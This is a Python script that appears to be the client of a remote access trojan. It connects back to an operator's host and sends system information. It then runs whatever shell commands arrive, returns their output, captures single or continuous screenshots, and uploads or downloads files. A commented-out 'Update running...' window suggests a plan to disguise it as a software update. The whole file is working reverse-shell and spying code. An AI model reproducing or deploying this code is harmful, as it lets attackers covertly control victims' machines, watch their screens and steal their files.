import time
import sys
import socket
import os
import random
from PIL import ImageGrab
#from tkinter import *

def mainFunc():
	s = socket.socket()
	host = str(input("set host> "))
	port = int(input("set port> "))

	s.connect((host, port))

	#PC info

	os.system("lscpu>data.txt")
	f = open("data.txt", "rb")
	l = f.read(1024)
	print(str(l))	
	while (l):
		s.send(l)
		l = f.read(1024)
		print(str(l))
			
		#s.close()
		#s.send("close".encode())
	f.close()
			
	print(str(l))
	s.send(l)

	#################

	print("\033[92m\033[mConnected\033[0m")
	_x = 4
	while _x == 4 :
		msg = s.recv(1024)
		msg = msg.decode()
		cmd_array = msg.split()

	#________________________________________________________________________________________________

		def ss():
			ss = ImageGrab.grab()
			ss.save("screenshot.jpg")
			_send("screenshot.jpg")
	#________________________________________________________________________________________________
		def _recv(_ext):
			#conn.send(msg.encode())
			fName = str(int(random.random()*100000000000)) + "." + _ext
			
			f = open(fName, 'wb')
			
			n = 1
			while n == 1:
					#f.write(l)
				l = s.recv(1024)
				f.write(l)
				if len(l) < 1024:
					n = 2
				
				
			print("\033[0m[\033[0m\033[1m\033[92m+\033[0m] " +fName + " saved successfully!")	
			f.close()
			
	#________________________________________________________________________________________________
		def _send(_file):
			f = open(_file, 'rb')
			print(_file)
			l = f.read(1024)
			print(str(l))	
			while (l):
				s.send(l)
				l = f.read(1024)

			print("File Sent!")
					
			f.close()
	#________________________________________________________________________________________________
				
		if (msg == "/"):
			_x += 10
			print("[-] Session closed!")
		elif (msg == "dump_ss"):
			ss()
		elif (msg == "live_screen"):
			key = 1
			while key == 1:
				ss()
				time.sleep(2)
		elif (str(cmd_array[0]) == "download"):
			_send(cmd_array[1])
		elif (str(cmd_array[0]) == "upload"):
			cmd_arr = msg.split('.')
			_ext = cmd_arr[-1]
			_recv(_ext)
		else:
			os.system(msg + ">data.txt")
			f = open("data.txt", "rb")
			l = f.read(1024)
			print(str(l))	
			while (l):
				s.send(l)
				l = f.read(1024)
				print(str(l))
			
			#s.close()
			#s.send("close".encode())
			f.close()
			
			print(str(l))
			s.send(l)
#root = Tk()
#root.title("Update running...")
#Label(root, text="Next ").pack()
#Button(root, command=mainFunc, text="Start", padx=20, pady=30).pack()

#root.mainloop()
mainFunc()
